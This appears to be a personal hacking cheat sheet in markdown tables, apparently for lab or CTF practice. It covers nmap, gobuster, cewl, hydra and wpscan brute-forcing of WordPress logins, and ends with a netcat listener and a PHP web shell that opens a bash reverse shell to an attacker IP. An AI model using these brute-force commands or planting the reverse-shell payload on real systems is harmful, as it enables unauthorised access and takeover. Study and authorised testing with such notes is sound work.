# Hacking Notes  

## Configuration files: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Use of VPN | openvpn           |openvpn [FILE]            |
| Use of nmap | nmap           | nmap [IP]/[RANGE] [OPTIONS]            |
| UDP nmap scan | nmap           | nmap [IP]/[RANGE] -sU             |
| TCP nmap scan (no ping) | nmap           | nmap [IP]/[RANGE] -Pn             |
| Directory discovery | gobuster           | gobuster dir -u [URL] -w [WORDLIST e.g. /usr/share/wordlists/dirb/common.txt


## Web files: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Robots File | robots.txt           | [IP]/robots.txt        |

## Data format: 
|Description                | Command                         |Syntax                 |
|----------------|-------------------------------|-----------------------------|
| Get only strings | strings           | strings [FILE]        |

## Wordpress files
|Description                | Syntax Path|                     
|----------------|-------------------------------|
| Conf backupfile | [file].swp        |

## Access
|Description                | Syntax Path|                     
|----------------|-------------------------------|
|ftp | ftp [IP]       |
|ssh | ssh [IP]       |

## Dictionaries
|Description                | Syntax Path|                     
|----------------|-------------------------------|
| cewl (Custom Word List generator) | cewl [URL] > [PWDFILE]       |


## Bruteforce

|Description                | Syntax Path|                     
|----------------|-------------------------------|
| hydra | hydra -L [USRFILE] -P [PWDFILE] [IP] -s [PORT] http-post-form "[url]:method=wp.getUsersBlogs&user=^USER^&password=^PASS^:Invalid" -V       |
| wordpress wpscan (using xmlrpc.php) | wpscan --url [URL] -U [USER] -P [PWDFILE]       |


## Privilege Escalation
Listen: nc -lvnp [PORT]

PHP Shell 
```<?php

if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}```

Linux Privilege Escalation Awesome Script (linPEAS)
